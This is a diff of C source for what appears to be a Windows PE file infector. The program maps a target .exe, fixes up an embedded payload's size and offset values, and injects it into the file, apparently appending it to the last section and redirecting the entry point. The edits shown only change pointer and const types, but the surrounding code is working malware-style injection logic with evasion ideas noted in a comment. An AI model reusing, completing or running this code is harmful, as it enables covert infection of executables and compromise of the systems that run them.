@@ -10,13 +10,13 @@
 // Ideas: Packing, unpacking, function hashing
 
 EXTERN_C_START
-extern VOID payload();
+extern CONST VOID payload();
 extern LONGLONG delta_start;
 extern LONGLONG to_c_code;
 extern ULONGLONG code_size;
 EXTERN_C_END
 
-VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPayload,
+VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PCBYTE pPayload,
                    IN CONST DWORD dwPayloadSize) {
     PIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
@@ -25,7 +25,7 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPaylo
     DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwNewEntryPoint;
 
     pDosHeader = (PIMAGE_DOS_HEADER)pMapAddress;
-    pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)pDosHeader + pDosHeader->e_lfanew);
+    pNtHeader = (PIMAGE_NT_HEADERS64)((PCBYTE)pDosHeader + pDosHeader->e_lfanew);
     wNbSections = pNtHeader->FileHeader.NumberOfSections;
     pSection = IMAGE_FIRST_SECTION(pNtHeader);
     dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
@@ -77,10 +77,10 @@ int main(int argc, char* argv[]) {
     DWORD dwFileSize, dwPayloadSize;
     ULARGE_INTEGER uliSize, uliOffset;
 
-    dwPayloadSize = (DWORD)((PBYTE)&code_size - (PBYTE)&payload + sizeof(code_size));
+    dwPayloadSize = (DWORD)((PCBYTE)&code_size - (PCBYTE)&payload + sizeof(code_size));
     printf("Payload size: %u\n", dwPayloadSize);
-    printf("Payload: %p\n", payload);
-    HexDump((PCBYTE)payload, dwPayloadSize);
+    printf("Payload: %p\n", &payload);
+    HexDump((PCBYTE)&payload, dwPayloadSize);
 
     if (argc < 2) {
         fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
@@ -123,11 +123,11 @@ int main(int argc, char* argv[]) {
     VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);
 
     VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
-    to_c_code = (PBYTE)&inj_code_c - (PBYTE)&payload;
+    to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
     VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);
 
     printf("[*] Injecting payload...\n");
-    InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PBYTE)payload, dwPayloadSize);
+    InjectPayload((PIMAGE_DOS_HEADER)pMapAddress, (PCBYTE)&payload, dwPayloadSize);
     printf("[*] Injection complete!\n");
 
     FlushViewOfFile(pMapAddress, 0);
